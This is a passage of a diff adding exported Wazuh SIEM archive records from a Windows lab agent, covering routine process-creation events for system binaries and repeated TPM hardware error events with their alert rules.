+                    "full_log": "{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-Security-Auditing\",\"providerGuid\":\"{54849625-5478-4994-a5ba-3e3b0328c30d}\",\"eventID\":\"4688\",\"version\":\"2\",\"level\":\"0\",\"task\":\"13312\",\"opcode\":\"0\",\"keywords\":\"0x8020000000000000\",\"systemTime\":\"2026-05-12T16:25:12.7995137Z\",\"eventRecordID\":\"29649\",\"processID\":\"4\",\"threadID\":\"7212\",\"channel\":\"Security\",\"computer\":\"WIN-C1OEL3I2PV8\",\"severityValue\":\"AUDIT_SUCCESS\",\"message\":\"\\\"A new process has been created.\\r\\n\\r\\nCreator Subject:\\r\\n\\tSecurity ID:\\t\\tS-1-5-18\\r\\n\\tAccount Name:\\t\\tWIN-C1OEL3I2PV8$\\r\\n\\tAccount Domain:\\t\\tWORKGROUP\\r\\n\\tLogon ID:\\t\\t0x3E7\\r\\n\\r\\nTarget Subject:\\r\\n\\tSecurity ID:\\t\\tS-1-0-0\\r\\n\\tAccount Name:\\t\\t-\\r\\n\\tAccount Domain:\\t\\t-\\r\\n\\tLogon ID:\\t\\t0x0\\r\\n\\r\\nProcess Information:\\r\\n\\tNew Process ID:\\t\\t0xff8\\r\\n\\tNew Process Name:\\tC:\\\\Windows\\\\System32\\\\taskhostw.exe\\r\\n\\tToken Elevation Type:\\tTokenElevationTypeDefault (1)\\r\\n\\tMandatory Label:\\t\\tS-1-16-16384\\r\\n\\tCreator Process ID:\\t0x554\\r\\n\\tCreator Process Name:\\tC:\\\\Windows\\\\System32\\\\svchost.exe\\r\\n\\tProcess Command Line:\\ttaskhostw.exe -RegisterDevice -ProtectionStateChanged -FreeNetworkOnly\\r\\n\\r\\nToken Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.\\r\\n\\r\\nType 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.\\r\\n\\r\\nType 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.\\r\\n\\r\\nType 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.\\\"\"},\"eventdata\":{\"subjectUserSid\":\"S-1-5-18\",\"subjectUserName\":\"WIN-C1OEL3I2PV8$\",\"subjectDomainName\":\"WORKGROUP\",\"subjectLogonId\":\"0x3e7\",\"newProcessId\":\"0xff8\",\"newProcessName\":\"C:\\\\\\\\Windows\\\\\\\\System32\\\\\\\\taskhostw.exe\",\"tokenElevationType\":\"%%1936\",\"processId\":\"0x554\",\"commandLine\":\"taskhostw.exe -RegisterDevice -ProtectionStateChanged -FreeNetworkOnly\",\"targetUserSid\":\"S-1-0-0\",\"targetLogonId\":\"0x0\",\"parentProcessName\":\"C:\\\\\\\\Windows\\\\\\\\System32\\\\\\\\svchost.exe\",\"mandatoryLabel\":\"S-1-16-16384\"}}}",
+                    "input": {
+                        "type": "log"
+                    },
+                    "@timestamp": "2026-05-12T16:25:14.181Z",
+                    "location": "EventChannel",
+                    "id": "1778603114.3278999",
+                    "timestamp": "2026-05-12T16:25:14.181+0000"
+                },
+                "sort": [
+                    1778603114181
+                ]
+            },
+            {
+                "_index": "wazuh-archives-4.x-2026.05.12",
+                "_id": "bBcBHZ4BTkZw-2441APu",
+                "_score": null,
+                "_source": {
+                    "agent": {
+                        "ip": "192.168.64.6",
+                        "name": "Windows-TARGET",
+                        "id": "002"
+                    },
+                    "manager": {
+                        "name": "wazuh.manager"
+                    },
+                    "data": {
+                        "win": {
+                            "eventdata": {
+                                "subjectLogonId": "0x3e7",
+                                "parentProcessName": "C:\\\\Windows\\\\System32\\\\svchost.exe",
+                                "subjectDomainName": "WORKGROUP",
+                                "tokenElevationType": "%%1936",
+                                "newProcessId": "0x724",
+                                "mandatoryLabel": "S-1-16-12288",
+                                "newProcessName": "C:\\\\Windows\\\\System32\\\\SecurityHealth\\\\10.0.29554.1001-0\\\\SecurityHealthHost.exe",
+                                "targetLogonId": "0x670c2",
+                                "targetUserName": "AmineMSc",
+                                "subjectUserSid": "S-1-5-18",
+                                "processId": "0x3bc",
+                                "targetDomainName": "WIN-C1OEL3I2PV8",
+                                "commandLine": "\\\\\\\\?\\\\C:\\\\Windows\\\\System32\\\\SecurityHealth\\\\10.0.29554.1001-0\\\\SecurityHealthHost.exe {08728914-3F57-4D52-9E31-49DAECA5A80A} -Embedding",
+                                "targetUserSid": "S-1-5-21-3827095766-909782368-2839298323-1001",
+                                "subjectUserName": "WIN-C1OEL3I2PV8$"
+                            },
+                            "system": {
+                                "eventID": "4688",
+                                "keywords": "0x8020000000000000",
+                                "providerGuid": "{54849625-5478-4994-a5ba-3e3b0328c30d}",
+                                "level": "0",
+                                "channel": "Security",
+                                "opcode": "0",
+                                "message": "\"A new process has been created.\r\n\r\nCreator Subject:\r\n\tSecurity ID:\t\tS-1-5-18\r\n\tAccount Name:\t\tWIN-C1OEL3I2PV8$\r\n\tAccount Domain:\t\tWORKGROUP\r\n\tLogon ID:\t\t0x3E7\r\n\r\nTarget Subject:\r\n\tSecurity ID:\t\tS-1-5-21-3827095766-909782368-2839298323-1001\r\n\tAccount Name:\t\tAmineMSc\r\n\tAccount Domain:\t\tWIN-C1OEL3I2PV8\r\n\tLogon ID:\t\t0x670C2\r\n\r\nProcess Information:\r\n\tNew Process ID:\t\t0x724\r\n\tNew Process Name:\tC:\\Windows\\System32\\SecurityHealth\\10.0.29554.1001-0\\SecurityHealthHost.exe\r\n\tToken Elevation Type:\tTokenElevationTypeDefault (1)\r\n\tMandatory Label:\t\tS-1-16-12288\r\n\tCreator Process ID:\t0x3bc\r\n\tCreator Process Name:\tC:\\Windows\\System32\\svchost.exe\r\n\tProcess Command Line:\t\\\\?\\C:\\Windows\\System32\\SecurityHealth\\10.0.29554.1001-0\\SecurityHealthHost.exe {08728914-3F57-4D52-9E31-49DAECA5A80A} -Embedding\r\n\r\nToken Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.\r\n\r\nType 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.\r\n\r\nType 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.\r\n\r\nType 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.\"",
+                                "version": "2",
+                                "systemTime": "2026-05-12T16:25:12.8964782Z",
+                                "eventRecordID": "29650",
+                                "threadID": "7212",
+                                "computer": "WIN-C1OEL3I2PV8",
+                                "task": "13312",
+                                "processID": "4",
+                                "severityValue": "AUDIT_SUCCESS",
+                                "providerName": "Microsoft-Windows-Security-Auditing"
+                            }
+                        }
+                    },
+                    "rule": {
+                        "firedtimes": 99,
+                        "mail": false,
+                        "level": 3,
+                        "description": "A process was created.",
+                        "groups": [
+                            "windows",
+                            " WEF"
+                        ],
+                        "id": "67027"
+                    },
+                    "decoder": {
+                        "name": "windows_eventchannel"
+                    },
+                    "full_log": "{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-Security-Auditing\",\"providerGuid\":\"{54849625-5478-4994-a5ba-3e3b0328c30d}\",\"eventID\":\"4688\",\"version\":\"2\",\"level\":\"0\",\"task\":\"13312\",\"opcode\":\"0\",\"keywords\":\"0x8020000000000000\",\"systemTime\":\"2026-05-12T16:25:12.8964782Z\",\"eventRecordID\":\"29650\",\"processID\":\"4\",\"threadID\":\"7212\",\"channel\":\"Security\",\"computer\":\"WIN-C1OEL3I2PV8\",\"severityValue\":\"AUDIT_SUCCESS\",\"message\":\"\\\"A new process has been created.\\r\\n\\r\\nCreator Subject:\\r\\n\\tSecurity ID:\\t\\tS-1-5-18\\r\\n\\tAccount Name:\\t\\tWIN-C1OEL3I2PV8$\\r\\n\\tAccount Domain:\\t\\tWORKGROUP\\r\\n\\tLogon ID:\\t\\t0x3E7\\r\\n\\r\\nTarget Subject:\\r\\n\\tSecurity ID:\\t\\tS-1-5-21-3827095766-909782368-2839298323-1001\\r\\n\\tAccount Name:\\t\\tAmineMSc\\r\\n\\tAccount Domain:\\t\\tWIN-C1OEL3I2PV8\\r\\n\\tLogon ID:\\t\\t0x670C2\\r\\n\\r\\nProcess Information:\\r\\n\\tNew Process ID:\\t\\t0x724\\r\\n\\tNew Process Name:\\tC:\\\\Windows\\\\System32\\\\SecurityHealth\\\\10.0.29554.1001-0\\\\SecurityHealthHost.exe\\r\\n\\tToken Elevation Type:\\tTokenElevationTypeDefault (1)\\r\\n\\tMandatory Label:\\t\\tS-1-16-12288\\r\\n\\tCreator Process ID:\\t0x3bc\\r\\n\\tCreator Process Name:\\tC:\\\\Windows\\\\System32\\\\svchost.exe\\r\\n\\tProcess Command Line:\\t\\\\\\\\?\\\\C:\\\\Windows\\\\System32\\\\SecurityHealth\\\\10.0.29554.1001-0\\\\SecurityHealthHost.exe {08728914-3F57-4D52-9E31-49DAECA5A80A} -Embedding\\r\\n\\r\\nToken Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.\\r\\n\\r\\nType 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.\\r\\n\\r\\nType 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.\\r\\n\\r\\nType 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.\\\"\"},\"eventdata\":{\"subjectUserSid\":\"S-1-5-18\",\"subjectUserName\":\"WIN-C1OEL3I2PV8$\",\"subjectDomainName\":\"WORKGROUP\",\"subjectLogonId\":\"0x3e7\",\"newProcessId\":\"0x724\",\"newProcessName\":\"C:\\\\\\\\Windows\\\\\\\\System32\\\\\\\\SecurityHealth\\\\\\\\10.0.29554.1001-0\\\\\\\\SecurityHealthHost.exe\",\"tokenElevationType\":\"%%1936\",\"processId\":\"0x3bc\",\"commandLine\":\"\\\\\\\\\\\\\\\\?\\\\\\\\C:\\\\\\\\Windows\\\\\\\\System32\\\\\\\\SecurityHealth\\\\\\\\10.0.29554.1001-0\\\\\\\\SecurityHealthHost.exe {08728914-3F57-4D52-9E31-49DAECA5A80A} -Embedding\",\"targetUserSid\":\"S-1-5-21-3827095766-909782368-2839298323-1001\",\"targetUserName\":\"AmineMSc\",\"targetDomainName\":\"WIN-C1OEL3I2PV8\",\"targetLogonId\":\"0x670c2\",\"parentProcessName\":\"C:\\\\\\\\Windows\\\\\\\\System32\\\\\\\\svchost.exe\",\"mandatoryLabel\":\"S-1-16-12288\"}}}",
+                    "input": {
+                        "type": "log"
+                    },
+                    "@timestamp": "2026-05-12T16:25:14.186Z",
+                    "location": "EventChannel",
+                    "id": "1778603114.3284738",
+                    "timestamp": "2026-05-12T16:25:14.186+0000"
+                },
+                "sort": [
+                    1778603114186
+                ]
+            },
+            {
+                "_index": "wazuh-archives-4.x-2026.05.12",
+                "_id": "bRcBHZ4BTkZw-2441APu",
+                "_score": null,
+                "_source": {
+                    "agent": {
+                        "ip": "192.168.64.6",
+                        "name": "Windows-TARGET",
+                        "id": "002"
+                    },
+                    "manager": {
+                        "name": "wazuh.manager"
+                    },
+                    "data": {
+                        "win": {
+                            "eventdata": {
+                                "driverFile": "0x2",
+                                "data": "3221225524",
+                                "lineNumber": "369"
+                            },
+                            "system": {
+                                "eventID": "15",
+                                "keywords": "0x8000000000000000",
+                                "providerGuid": "{1b6b0772-251b-4d42-917d-faca166bc059}",
+                                "level": "2",
+                                "channel": "System",
+                                "opcode": "0",
+                                "message": "\"The device driver for the Trusted Platform Module (TPM) encountered a non-recoverable error in the TPM hardware, which prevents TPM services (such as data encryption) from being used. For further help, please contact the computer manufacturer.\"",
+                                "version": "0",
+                                "systemTime": "2026-05-12T16:25:12.8746685Z",
+                                "eventRecordID": "1999",
+                                "threadID": "4200",
+                                "computer": "WIN-C1OEL3I2PV8",
+                                "task": "0",
+                                "processID": "9752",
+                                "severityValue": "ERROR",
+                                "providerName": "TPM"
+                            }
+                        }
+                    },
+                    "rule": {
+                        "firedtimes": 23,
+                        "mail": false,
+                        "level": 5,
+                        "description": "Windows System error event",
+                        "groups": [
+                            "windows",
+                            "windows_system",
+                            "system_error"
+                        ],
+                        "id": "61102",
+                        "gpg13": [
+                            "4.3"
+                        ],
+                        "gdpr": [
+                            "IV_35.7.d"
+                        ]
+                    },
+                    "decoder": {
+                        "name": "windows_eventchannel"
+                    },
+                    "full_log": "{\"win\":{\"system\":{\"providerName\":\"TPM\",\"providerGuid\":\"{1b6b0772-251b-4d42-917d-faca166bc059}\",\"eventID\":\"15\",\"version\":\"0\",\"level\":\"2\",\"task\":\"0\",\"opcode\":\"0\",\"keywords\":\"0x8000000000000000\",\"systemTime\":\"2026-05-12T16:25:12.8746685Z\",\"eventRecordID\":\"1999\",\"processID\":\"9752\",\"threadID\":\"4200\",\"channel\":\"System\",\"computer\":\"WIN-C1OEL3I2PV8\",\"severityValue\":\"ERROR\",\"message\":\"\\\"The device driver for the Trusted Platform Module (TPM) encountered a non-recoverable error in the TPM hardware, which prevents TPM services (such as data encryption) from being used. For further help, please contact the computer manufacturer.\\\"\"},\"eventdata\":{\"driverFile\":\"0x2\",\"lineNumber\":\"369\",\"data\":\"3221225524\"}}}",
+                    "input": {
+                        "type": "log"
+                    },
+                    "@timestamp": "2026-05-12T16:25:14.255Z",
+                    "location": "EventChannel",
+                    "id": "1778603114.3291293",
+                    "timestamp": "2026-05-12T16:25:14.255+0000"
+                },
+                "sort": [
+                    1778603114255
+                ]
+            },
+            {
+                "_index": "wazuh-archives-4.x-2026.05.12",
+                "_id": "bhcBHZ4BTkZw-2441APu",
+                "_score": null,
+                "_source": {
+                    "agent": {
+                        "ip": "192.168.64.6",
+                        "name": "Windows-TARGET",
+                        "id": "002"
+                    },
+                    "manager": {
+                        "name": "wazuh.manager"
+                    },
+                    "data": {
+                        "win": {
+                            "eventdata": {
+                                "driverFile": "0x2",
+                                "data": "3221225524",
+                                "lineNumber": "369"
+                            },
+                            "system": {
+                                "eventID": "15",
+                                "keywords": "0x8000000000000000",
+                                "providerGuid": "{1b6b0772-251b-4d42-917d-faca166bc059}",
+                                "level": "2",
+                                "channel": "System",
+                                "opcode": "0",
+                                "message": "\"The device driver for the Trusted Platform Module (TPM) encountered a non-recoverable error in the TPM hardware, which prevents TPM services (such as data encryption) from being used. For further help, please contact the computer manufacturer.\"",
+                                "version": "0",
+                                "systemTime": "2026-05-12T16:25:12.8768594Z",
+                                "eventRecordID": "2000",
+                                "threadID": "4200",
+                                "computer": "WIN-C1OEL3I2PV8",
+                                "task": "0",
+                                "processID": "9752",
+                                "severityValue": "ERROR",
+                                "providerName": "TPM"
+                            }
+                        }
+                    },
+                    "rule": {
+                        "firedtimes": 24,
+                        "mail": false,
+                        "level": 5,
+                        "description": "Windows System error event",
+                        "groups": [
+                            "windows",
+                            "windows_system",
+                            "system_error"
+                        ],
+                        "id": "61102",
+                        "gpg13": [
+                            "4.3"
+                        ],
+                        "gdpr": [
+                            "IV_35.7.d"
+                        ]
+                    },
+                    "decoder": {
+                        "name": "windows_eventchannel"
+                    },
+                    "full_log": "{\"win\":{\"system\":{\"providerName\":\"TPM\",\"providerGuid\":\"{1b6b0772-251b-4d42-917d-faca166bc059}\",\"eventID\":\"15\",\"version\":\"0\",\"level\":\"2\",\"task\":\"0\",\"opcode\":\"0\",\"keywords\":\"0x8000000000000000\",\"systemTime\":\"2026-05-12T16:25:12.8768594Z\",\"eventRecordID\":\"2000\",\"processID\":\"9752\",\"threadID\":\"4200\",\"channel\":\"System\",\"computer\":\"WIN-C1OEL3I2PV8\",\"severityValue\":\"ERROR\",\"message\":\"\\\"The device driver for the Trusted Platform Module (TPM) encountered a non-recoverable error in the TPM hardware, which prevents TPM services (such as data encryption) from being used. For further help, please contact the computer manufacturer.\\\"\"},\"eventdata\":{\"driverFile\":\"0x2\",\"lineNumber\":\"369\",\"data\":\"3221225524\"}}}",
+                    "input": {
+                        "type": "log"
+                    },
+                    "@timestamp": "2026-05-12T16:25:14.258Z",
+                    "location": "EventChannel",
+                    "id": "1778603114.3293027",
+                    "timestamp": "2026-05-12T16:25:14.258+0000"
+                },
+                "sort": [
+                    1778603114258
+                ]
+            },
+            {
+                "_index": "wazuh-archives-4.x-2026.05.12",
+                "_id": "bxcBHZ4BTkZw-2441APu",
+                "_score": null,
+                "_source": {
+                    "agent": {
+                        "ip": "192.168.64.6",
+                        "name": "Windows-TARGET",
+                        "id": "002"
+                    },
+                    "manager": {
+                        "name": "wazuh.manager"
+                    },
+                    "data": {
+                        "win": {
+                            "eventdata": {
+                                "driverFile": "0x2",
+                                "data": "3221225524",
+                                "lineNumber": "369"
+                            },
+                            "system": {
+                                "eventID": "15",
+                                "keywords": "0x8000000000000000",
+                                "providerGuid": "{1b6b0772-251b-4d42-917d-faca166bc059}",
+                                "level": "2",
+                                "channel": "System",
+                                "opcode": "0",
+                                "message": "\"The device driver for the Trusted Platform Module (TPM) encountered a non-recoverable error in the TPM hardware, which prevents TPM services (such as data encryption) from being used. For further help, please contact the computer manufacturer.\"",
+                                "version": "0",
+                                "systemTime": "2026-05-12T16:25:12.9023251Z",
+                                "eventRecordID": "2001",
+                                "threadID": "8540",
+                                "computer": "WIN-C1OEL3I2PV8",
+                                "task": "0",
+                                "processID": "9752",
+                                "severityValue": "ERROR",
+                                "providerName": "TPM"
+                            }
+                        }
+                    },
+                    "rule": {
+                        "firedtimes": 25,
+                        "mail": false,
+                        "level": 5,
+                        "description": "Windows System error event",
+                        "groups": [
+                            "windows",
+                            "windows_system",
+                            "system_error"
+                        ],
+                        "id": "61102",
+                        "gpg13": [
+                            "4.3"
+                        ],
+                        "gdpr": [
+                            "IV_35.7.d"
+                        ]
+                    },
+                    "decoder": {
+                        "name": "windows_eventchannel"
+                    },
+                    "full_log": "{\"win\":{\"system\":{\"providerName\":\"TPM\",\"providerGuid\":\"{1b6b0772-251b-4d42-917d-faca166bc059}\",\"eventID\":\"15\",\"version\":\"0\",\"level\":\"2\",\"task\":\"0\",\"opcode\":\"0\",\"keywords\":\"0x8000000000000000\",\"systemTime\":\"2026-05-12T16:25:12.9023251Z\",\"eventRecordID\":\"2001\",\"processID\":\"9752\",\"threadID\":\"8540\",\"channel\":\"System\",\"computer\":\"WIN-C1OEL3I2PV8\",\"severityValue\":\"ERROR\",\"message\":\"\\\"The device driver for the Trusted Platform Module (TPM) encountered a non-recoverable error in the TPM hardware, which prevents TPM services (such as data encryption) from being used. For further help, please contact the computer manufacturer.\\\"\"},\"eventdata\":{\"driverFile\":\"0x2\",\"lineNumber\":\"369\",\"data\":\"3221225524\"}}}",
+                    "input": {
+                        "type": "log"
+                    },
+                    "@timestamp": "2026-05-12T16:25:14.265Z",
+                    "location": "EventChannel",
+                    "id": "1778603114.3294761",
+                    "timestamp": "2026-05-12T16:25:14.265+0000"
+                },
+                "sort": [
+                    1778603114265
+                ]
+            },
+            {
+                "_index": "wazuh-archives-4.x-2026.05.12",
+                "_id": "cBcBHZ4BTkZw-2441APu",
+                "_score": null,
+                "_source": {
+                    "agent": {
+                        "ip": "192.168.64.6",
+                        "name": "Windows-TARGET",
+                        "id": "002"
+                    },
+                    "previous_output": "{\"win\":{\"system\":{\"providerName\":\"TPM\",\"providerGuid\":\"{1b6b0772-251b-4d42-917d-faca166bc059}\",\"eventID\":\"15\",\"version\":\"0\",\"level\":\"2\",\"task\":\"0\",\"opcode\":\"0\",\"keywords\":\"0x8000000000000000\",\"systemTime\":\"2026-05-12T16:25:12.9023251Z\",\"eventRecordID\":\"2001\",\"processID\":\"9752\",\"threadID\":\"8540\",\"channel\":\"System\",\"computer\":\"WIN-C1OEL3I2PV8\",\"severityValue\":\"ERROR\",\"message\":\"\\\"The device driver for the Trusted Platform Module (TPM) encountered a non-recoverable error in the TPM hardware, which prevents TPM services (such as data encryption) from being used. For further help, please contact the computer manufacturer.\\\"\"},\"eventdata\":{\"driverFile\":\"0x2\",\"lineNumber\":\"369\",\"data\":\"3221225524\"}}}\n{\"win\":{\"system\":{\"providerName\":\"TPM\",\"providerGuid\":\"{1b6b0772-251b-4d42-917d-faca166bc059}\",\"eventID\":\"15\",\"version\":\"0\",\"level\":\"2\",\"task\":\"0\",\"opcode\":\"0\",\"keywords\":\"0x8000000000000000\",\"systemTime\":\"2026-05-12T16:25:12.8768594Z\",\"eventRecordID\":\"2000\",\"processID\":\"9752\",\"threadID\":\"4200\",\"channel\":\"System\",\"computer\":\"WIN-C1OEL3I2PV8\",\"severityValue\":\"ERROR\",\"message\":\"\\\"The device driver for the Trusted Platform Module (TPM) encountered a non-recoverable error in the TPM hardware, which prevents TPM services (such as data encryption) from being used. For further help, please contact the computer manufacturer.\\\"\"},\"eventdata\":{\"driverFile\":\"0x2\",\"lineNumber\":\"369\",\"data\":\"3221225524\"}}}\n{\"win\":{\"system\":{\"providerName\":\"TPM\",\"providerGuid\":\"{1b6b0772-251b-4d42-917d-faca166bc059}\",\"eventID\":\"15\",\"version\":\"0\",\"level\":\"2\",\"task\":\"0\",\"opcode\":\"0\",\"keywords\":\"0x8000000000000000\",\"systemTime\":\"2026-05-12T16:25:12.8746685Z\",\"eventRecordID\":\"1999\",\"processID\":\"9752\",\"threadID\":\"4200\",\"channel\":\"System\",\"computer\":\"WIN-C1OEL3I2PV8\",\"severityValue\":\"ERROR\",\"message\":\"\\\"The device driver for the Trusted Platform Module (TPM) encountered a non-recoverable error in the TPM hardware, which prevents TPM services (such as data encryption) from being used. For further help, please contact the computer manufacturer.\\\"\"},\"eventdata\":{\"driverFile\":\"0x2\",\"lineNumber\":\"369\",\"data\":\"3221225524\"}}}\n{\"win\":{\"system\":{\"providerName\":\"TPM\",\"providerGuid\":\"{1b6b0772-251b-4d42-917d-faca166bc059}\",\"eventID\":\"15\",\"version\":\"0\",\"level\":\"2\",\"task\":\"0\",\"opcode\":\"0\",\"keywords\":\"0x8000000000000000\",\"systemTime\":\"2026-05-12T16:23:42.6856435Z\",\"eventRecordID\":\"1998\",\"processID\":\"9752\",\"threadID\":\"4200\",\"channel\":\"System\",\"computer\":\"WIN-C1OEL3I2PV8\",\"severityValue\":\"ERROR\",\"message\":\"\\\"The device driver for the Trusted Platform Module (TPM) encountered a non-recoverable error in the TPM hardware, which prevents TPM services (such as data encryption) from being used. For further help, please contact the computer manufacturer.\\\"\"},\"eventdata\":{\"driverFile\":\"0x2\",\"lineNumber\":\"369\",\"data\":\"3221225524\"}}}\n{\"win\":{\"system\":{\"providerName\":\"TPM\",\"providerGuid\":\"{1b6b0772-251b-4d42-917d-faca166bc059}\",\"eventID\":\"15\",\"version\":\"0\",\"level\":\"2\",\"task\":\"0\",\"opcode\":\"0\",\"keywords\":\"0x8000000000000000\",\"systemTime\":\"2026-05-12T16:23:42.6836161Z\",\"eventRecordID\":\"1997\",\"processID\":\"9752\",\"threadID\":\"4200\",\"channel\":\"System\",\"computer\":\"WIN-C1OEL3I2PV8\",\"severityValue\":\"ERROR\",\"message\":\"\\\"The device driver for the Trusted Platform Module (TPM) encountered a non-recoverable error in the TPM hardware, which prevents TPM services (such as data encryption) from being used. For further help, please contact the computer manufacturer.\\\"\"},\"eventdata\":{\"driverFile\":\"0x2\",\"lineNumber\":\"369\",\"data\":\"3221225524\"}}}\n{\"win\":{\"system\":{\"providerName\":\"TPM\",\"providerGuid\":\"{1b6b0772-251b-4d42-917d-faca166bc059}\",\"eventID\":\"15\",\"version\":\"0\",\"level\":\"2\",\"task\":\"0\",\"opcode\":\"0\",\"keywords\":\"0x8000000000000000\",\"systemTime\":\"2026-05-12T16:23:42.6288880Z\",\"eventRecordID\":\"1996\",\"processID\":\"9752\",\"threadID\":\"9564\",\"channel\":\"System\",\"computer\":\"WIN-C1OEL3I2PV8\",\"severityValue\":\"ERROR\",\"message\":\"\\\"The device driver for the Trusted Platform Module (TPM) encountered a non-recoverable error in the TPM hardware, which prevents TPM services (such as data encryption) from being used. For further help, please contact the computer manufacturer.\\\"\"},\"eventdata\":{\"driverFile\":\"0x2\",\"lineNumber\":\"369\",\"data\":\"3221225524\"}}}\n{\"win\":{\"system\":{\"providerName\":\"TPM\",\"providerGuid\":\"{1b6b0772-251b-4d42-917d-faca166bc059}\",\"eventID\":\"15\",\"version\":\"0\",\"level\":\"2\",\"task\":\"0\",\"opcode\":\"0\",\"keywords\":\"0x8000000000000000\",\"systemTime\":\"2026-05-12T16:23:42.6097283Z\",\"eventRecordID\":\"1995\",\"processID\":\"9752\",\"threadID\":\"9564\",\"channel\":\"System\",\"computer\":\"WIN-C1OEL3I2PV8\",\"severityValue\":\"ERROR\",\"message\":\"\\\"The device driver for the Trusted Platform Module (TPM) encountered a non-recoverable error in the TPM hardware, which prevents TPM services (such as data encryption) from being used. For further help, please contact the computer manufacturer.\\\"\"},\"eventdata\":{\"driverFile\":\"0x2\",\"lineNumber\":\"369\",\"data\":\"3221225524\"}}}",
+                    "manager": {
+                        "name": "wazuh.manager"
+                    },
+                    "data": {
+                        "win": {
+                            "eventdata": {
+                                "driverFile": "0x2",
+                                "data": "3221225524",
+                                "lineNumber": "369"
+                            },
+                            "system": {
+                                "eventID": "15",
+                                "keywords": "0x8000000000000000",
+                                "providerGuid": "{1b6b0772-251b-4d42-917d-faca166bc059}",
+                                "level": "2",
+                                "channel": "System",
+                                "opcode": "0",
+                                "message": "\"The device driver for the Trusted Platform Module (TPM) encountered a non-recoverable error in the TPM hardware, which prevents TPM services (such as data encryption) from being used. For further help, please contact the computer manufacturer.\"",
+                                "version": "0",
+                                "systemTime": "2026-05-12T16:25:12.9051046Z",
+                                "eventRecordID": "2002",
+                                "threadID": "8540",
+                                "computer": "WIN-C1OEL3I2PV8",
+                                "task": "0",
+                                "processID": "9752",
+                                "severityValue": "ERROR",
+                                "providerName": "TPM"
+                            }
+                        }
+                    },
+                    "rule": {
+                        "firedtimes": 2,
+                        "mail": false,
+                        "level": 10,
+                        "description": "Multiple System error events",
+                        "groups": [
+                            "windows",
+                            "windows_system"
+                        ],
+                        "id": "61110",
+                        "frequency": 8
+                    },
+                    "decoder": {
+                        "name": "windows_eventchannel"
+                    },
+                    "full_log": "{\"win\":{\"system\":{\"providerName\":\"TPM\",\"providerGuid\":\"{1b6b0772-251b-4d42-917d-faca166bc059}\",\"eventID\":\"15\",\"version\":\"0\",\"level\":\"2\",\"task\":\"0\",\"opcode\":\"0\",\"keywords\":\"0x8000000000000000\",\"systemTime\":\"2026-05-12T16:25:12.9051046Z\",\"eventRecordID\":\"2002\",\"processID\":\"9752\",\"threadID\":\"8540\",\"channel\":\"System\",\"computer\":\"WIN-C1OEL3I2PV8\",\"severityValue\":\"ERROR\",\"message\":\"\\\"The device driver for the Trusted Platform Module (TPM) encountered a non-recoverable error in the TPM hardware, which prevents TPM services (such as data encryption) from being used. For further help, please contact the computer manufacturer.\\\"\"},\"eventdata\":{\"driverFile\":\"0x2\",\"lineNumber\":\"369\",\"data\":\"3221225524\"}}}",
+                    "input": {
+                        "type": "log"
+                    },
+                    "@timestamp": "2026-05-12T16:25:14.286Z",
+                    "location": "EventChannel",
+                    "id": "1778603114.3296495",
+                    "timestamp": "2026-05-12T16:25:14.286+0000"
+                },
+                "sort": [
+                    1778603114286
+                ]
+            },
+            {
+                "_index": "wazuh-archives-4.x-2026.05.12",
+                "_id": "fRcBHZ4BTkZw-2444AOv",
+                "_score": null,
+                "_source": {
+                    "agent": {
+                        "ip": "192.168.64.6",
+                        "name": "Windows-TARGET",
+                        "id": "002"
+                    },
+                    "manager": {
+                        "name": "wazuh.manager"
+                    },
+                    "data": {
+                        "win": {
+                            "eventdata": {
+                                "subjectLogonId": "0x3e7",
+                                "parentProcessName": "C:\\\\Windows\\\\System32\\\\svchost.exe",
+                                "subjectDomainName": "WORKGROUP",
+                                "tokenElevationType": "%%1936",
+                                "newProcessId": "0x93c",
+                                "mandatoryLabel": "S-1-16-12288",
+                                "newProcessName": "C:\\\\Windows\\\\ImmersiveControlPanel\\\\SystemSettings.exe",
+                                "targetLogonId": "0x670c2",
+                                "targetUserName": "AmineMSc",
+                                "subjectUserSid": "S-1-5-18",
+                                "processId": "0x3bc",
+                                "targetDomainName": "WIN-C1OEL3I2PV8",
+                                "commandLine": "\\\"C:\\\\Windows\\\\ImmersiveControlPanel\\\\SystemSettings.exe\\\" -ServerName:microsoft.windows.immersivecontrolpanel",
+                                "targetUserSid": "S-1-5-21-3827095766-909782368-2839298323-1001",
+                                "subjectUserName": "WIN-C1OEL3I2PV8$"
+                            },
+                            "system": {
+                                "eventID": "4688",
+                                "keywords": "0x8020000000000000",
+                                "providerGuid": "{54849625-5478-4994-a5ba-3e3b0328c30d}",
+                                "level": "0",
+                                "channel": "Security",
+                                "opcode": "0",
